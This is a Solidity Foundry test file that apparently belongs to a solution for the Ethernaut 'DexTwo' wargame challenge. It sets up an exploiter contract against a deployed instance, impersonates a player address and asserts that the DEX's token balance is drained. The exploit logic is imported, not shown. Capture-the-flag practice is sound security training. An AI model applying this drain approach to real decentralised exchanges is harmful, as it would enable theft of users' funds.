// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import "../src/23-DexTwo.sol";

contract DexTwoTest is Test {
    IDexTwo public dexInstance;
    DexTwo public exploiter;
    address public token1;
    address public token2;

    function setUp() public {
        address instanceAddress = 0xFf1d25EB895897a536c1b6b794E3110A787FB2d0;
        dexInstance = IDexTwo(instanceAddress);
        exploiter = new DexTwo(instanceAddress);
        token1 = dexInstance.token1();
        token2 = dexInstance.token2();
    }

    function test_drain() public {
        vm.startPrank(0xBF8641831D15c2701BA122981C3D7A6A2533ea48, 0xBF8641831D15c2701BA122981C3D7A6A2533ea48);
        exploiter.drain();
        assert(
            IERC20(token1).balanceOf(address(dexInstance)) == 0 || IERC20(token2).balanceOf(address(dexInstance)) == 0
        );
    }
}
